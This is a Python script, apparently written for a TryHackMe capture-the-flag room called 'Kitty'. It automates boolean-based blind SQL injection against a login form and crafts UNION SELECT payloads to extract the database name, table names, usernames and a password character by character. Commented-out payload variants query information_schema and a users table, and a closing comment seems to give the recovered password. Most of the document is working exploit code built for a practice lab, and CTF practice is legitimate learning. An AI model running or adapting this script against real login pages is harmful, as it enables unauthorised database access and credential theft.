import requests

# main source: https://0xb0b.gitbook.io/writeups/tryhackme/2024/kitty

# put this line in your /etc/hosts: 
# <target_IP> kitty.thm 

# first we captured the request in Burpsuite and saved it as XML
# from the XML, I copied out the request itself and decoded it from base64 (base64 -d req.txt)

'''
POST /index.php HTTP/1.1
Host: kitty.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://kitty.thm
Connection: keep-alive
Referer: http://kitty.thm/index.php
Cookie: PHPSESSID=cs8vkesccpk6drri5flodi0o5v
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=username&password=password
'''

# now we use 0xb0b's writeup on this room to aid us in writing this script

# we will be automating a boolean-based wildcard SQLi to find out database name

# the request will be along the lines 

# ' UNION SELECT 1,2,3,4 where database() like '%'; -- -

possible_chars = '+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
url = 'http://kitty.thm/index.php'

# for the headers, we leave out the dynamic ones (eg. content-length, PHPSESSID)
# we also change connection to close

headers = {
    'Host': 'kitty.thm',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://kitty.thm',
    'Connection': 'close',
    'Referer': 'http://kitty.thm/index.php'
}

#__What we know__:

# the table has 4 columns
# because ### ' UNION SELECT 1,2,3,4; -- - ### allowed us to login

# the correct response size is 618 (shows upon succesful login) 

# let the guessing begin...

result = ''
done = False



while not done:
    for guess in possible_chars:
        # we will be utilizing current result and appending next guess
        #request = f"' UNION SELECT 1,2,3,4 where database() like '{result}{guess}%';-- -"
        request = f"' UNION SELECT 1,2,3,4 from siteusers where username='kitty' and password like BINARY '{result}{guess}%' -- -"
        # other request possibilities for different things:
            # get the table:
            #request = f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' and table_name like '{result}{guess}%';-- -"
            # get user:
            # request = f"' UNION SELECT 1,2,3,4 from siteusers where username like '{result}{guess}%' -- -"
            # get password for found user kitty:
                # note that we use BINARY to get case sensitive result
            # request = f"' UNION SELECT 1,2,3,4 from siteusers where username='kitty' and password like BINARY '{result}{guess}%' -- -"
        form_data = {
            'username': request,
            'password': 'doesnotmatter'
        }
        response = requests.post(url, headers=headers, data=form_data, allow_redirects=True)
        # now if the response content has length of 618 bytes, we got a hit
        if (len(response.content) == 618):
            result += guess
            break
        # if guessed char is "_" we either found the whole thing or ran out of chars meaning it has a char outside our guessing space
        if (guess == possible_chars[-1]):
            print('\033[K')
            print(result)
            done = True
            exit()
        # else we print the current result (+guess) onto the terminal
        if(guess != "\n"):
            print(result+guess, end='\r')



'''

Thank you, 0xb0b!

P.S. his script is much better
and he has a script that automates all of this at once

and also my dear kitty... L0ng_Liv3_KittY
'''